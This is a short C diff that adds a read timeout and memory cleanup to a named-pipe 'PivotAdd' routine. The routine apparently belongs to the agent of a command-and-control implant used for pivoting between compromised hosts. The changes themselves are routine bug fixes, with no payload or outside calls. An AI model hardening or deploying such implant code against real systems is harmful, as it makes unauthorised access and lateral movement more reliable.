@@ -50,6 +50,9 @@ BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PDWORD BytesSize )
         }
     }
 
+    /* bound the wait for the pivot to answer: never block the dispatch thread forever */
+    DWORD Timeout = 0;
+
     do
     {
         // TODO: first get the size then parse
@@ -79,12 +82,22 @@ BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PDWORD BytesSize )
                 {
                     PRINTF( "ReadFile: Failed[%d]\n", NtGetLastError() );
                     SysNtClose( Handle );
+                    Instance->Win32.LocalFree( *Output );
+                    *Output = NULL;
                     return FALSE;
                 }
             }
 
-            /* nothing to read yet: don't spin at full speed */
+            /* nothing to read yet: don't spin at full speed.
+             * bail out after ~5 seconds of silence (same bound as WaitNamedPipeW above) */
             SharedSleep( 10 );
+
+            if ( ++Timeout >= 500 )
+            {
+                PUTS( "PivotAdd: Timed out waiting for pivot response" )
+                SysNtClose( Handle );
+                return FALSE;
+            }
         }
         else
         {
@@ -104,6 +117,8 @@ BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PDWORD BytesSize )
         {
             PRINTF( "LocalAlloc: Failed[%d]\n", NtGetLastError() );
             SysNtClose( Handle );
+            Instance->Win32.LocalFree( *Output );
+            *Output = NULL;
             return FALSE;
         }
 
@@ -118,6 +133,8 @@ BOOL PivotAdd( BUFFER NamedPipe, PVOID* Output, PDWORD BytesSize )
             PRINTF( "LocalAlloc: Failed[%d]\n", NtGetLastError() );
             SysNtClose( Handle );
             Instance->Win32.LocalFree( Data );
+            Instance->Win32.LocalFree( *Output );
+            *Output = NULL;
             return FALSE;
         }
 
